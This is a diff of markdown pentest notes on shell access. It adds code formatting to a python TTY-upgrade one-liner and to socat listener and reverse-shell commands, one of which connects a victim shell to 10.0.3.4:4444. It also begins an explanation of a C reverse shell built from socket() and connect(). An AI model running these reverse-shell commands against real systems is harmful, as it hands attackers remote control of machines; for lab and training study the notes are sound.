@@ -37,9 +37,9 @@ There are two ways to access a shell (bind shell and reverse shell)
 using python
 
   on victim:
-     
+    ``` 
     python3 -c 'import pty; pty.spawn("/bin/bash")'
-    
+    ```
     (press on your keyboard) Ctrl+Z
 
     (press on your keyboard) Enter
@@ -62,13 +62,42 @@ using python
     
  using socat:
  on host(attacker):
- 
+ ```bash
     socat file:`tty`,raw,echo=0 tcp-listen:4444
-  
+ ``` 
  on victim :
- 
+
+```bash
     socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
-  
+```
     
-    
-  
+# C reverse shell (shell.c)
+
+## Socket Creation
+
+sockfd: socket descriptor, an integer (like a file-handle)
+
+domain: integer, specifies communication domain.
+   - AF_ LOCAL: as defined in the POSIX standard for communication between processes on the same host. 
+   - AF_INET: For communicating between processes on different hosts connected by IPV4
+   - AF_I NET 6 for processes connected by IPV6.
+   - AF_BLUETOOTH is used for low-level Bluetooth connection.
+type: communication type
+   - SOCK_STREAM: TCP connection
+   - SOCK_DGRAM: UDP connection
+protocol: Protocol value for Internet Protocol(IP), number on protocl field in the Ip header of a packet. 
+
+```
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+```
+## Socket Connection
+
+Sends connection request to Socket and connects if open (returns 0); fails otherwise (returns -1)
+
+```
+    connect(sockfd, (struct sockadr *)&addr, sizeof(addr));
+```
+
+
+https://www.geeksforgeeks.org/socket-programming-cc/
